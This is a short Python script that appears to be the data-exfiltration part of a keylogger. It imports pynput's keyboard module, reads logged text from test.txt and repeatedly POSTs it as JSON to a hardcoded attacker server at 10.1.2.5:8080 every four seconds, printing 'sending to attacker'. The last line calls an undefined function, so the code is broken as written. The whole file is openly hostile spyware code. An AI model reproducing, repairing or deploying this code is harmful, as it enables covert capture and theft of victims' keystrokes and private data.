import os
import sys

from pynput import keyboard

import requests

import json

#  The Timer module is part of the threading package.
import threading

# our data
text = ""


ip_address = "10.1.2.5"
port_number = "8080"

#Time interval in seconds for code to execute.
time_interval = 4
 
def send_post_req():
    try:  
        f = open("test.txt", "r")
        text=f.read()
        print(text)
        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
        payload = json.dumps({"Data" : text})
        
        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        
        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        
        # We start the timer thread.
        timer.start()
    except Exception as e:
        print("Couldn't complete request!")
        print(e)
     
print("sending to attacker")
end_post_req()
